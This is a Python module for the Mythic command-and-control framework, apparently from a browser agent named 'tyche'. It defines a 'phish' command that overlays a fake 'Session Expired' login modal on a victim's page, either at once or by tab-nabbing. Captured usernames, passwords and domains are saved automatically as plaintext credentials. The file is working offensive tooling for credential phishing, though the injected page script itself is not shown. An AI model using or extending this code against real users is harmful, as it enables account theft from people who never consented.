from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class PhishArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="title",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="Session Expired",
                description="Modal title text",
            ),
            CommandParameter(
                name="subtitle",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="Your session has timed out. Please sign in again to continue.",
                description="Modal subtitle/description text",
            ),
            CommandParameter(
                name="trigger",
                type=ParameterType.ChooseOne,
                choices=["immediate", "tab_switch"],
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )],
                default_value="immediate",
                description="When to show the modal: immediately or when user switches tabs and returns (tab nabbing)",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            try:
                self.load_args_from_json_string(self.command_line)
            except:
                pass

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class PhishCommand(CommandBase):
    cmd = "phish"
    needs_admin = False
    help_cmd = "phish"
    description = "Inject a fake login modal over the page. Captures credentials when submitted. Supports immediate display or tab-nabbing (shows on tab return). Captured credentials are auto-stored in Mythic."
    version = 2
    author = "@grampae"
    attackmapping = ["T1056.002"]
    argument_class = PhishArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS("Browser")]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        title = task.args.get_arg("title") or "Session Expired"
        trigger = task.args.get_arg("trigger") or "immediate"
        task.display_params = '"{}" ({})'.format(title, trigger)
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)

        # Auto-store captured credentials in Mythic
        try:
            data = json.loads(response)
            if data.get("username") or data.get("password"):
                await SendMythicRPCCredentialCreate(MythicRPCCredentialCreateMessage(
                    TaskID=task.Task.ID,
                    Credentials=[MythicRPCCredentialData(
                        credential_type="plaintext",
                        realm=data.get("domain", ""),
                        account=data.get("username", ""),
                        credential=data.get("password", ""),
                        comment="Phished via tyche on {} ({})".format(
                            data.get("url", ""),
                            data.get("capturedAt", "")
                        )
                    )]
                ))
        except Exception:
            pass

        return resp
